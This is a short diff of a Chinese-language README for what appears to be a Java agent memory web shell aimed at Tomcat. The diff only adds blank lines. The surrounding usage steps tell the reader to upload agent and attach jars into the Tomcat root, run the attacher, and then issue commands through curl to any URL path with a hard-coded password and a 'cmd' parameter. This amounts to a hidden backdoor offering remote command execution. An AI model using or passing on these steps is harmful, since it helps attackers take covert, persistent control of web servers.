@@ -14,5 +14,7 @@ inst.redefinessClass
 inst.retransformClass
 ### 使用方法
 1、Tomcat的根目录中上传：Agent-1.0-SNAPSHOT-jar-with-dependencies.jar、Attach-1.0-SNAPSHOT-jar-with-dependencies.jar
+
 2、java -jar Attach-1.0-SNAPSHOT-jar-with-dependencies.jar
+
 3、curl http://tomcat:port/anypath?passwod=ga0weI&cmd={xx}
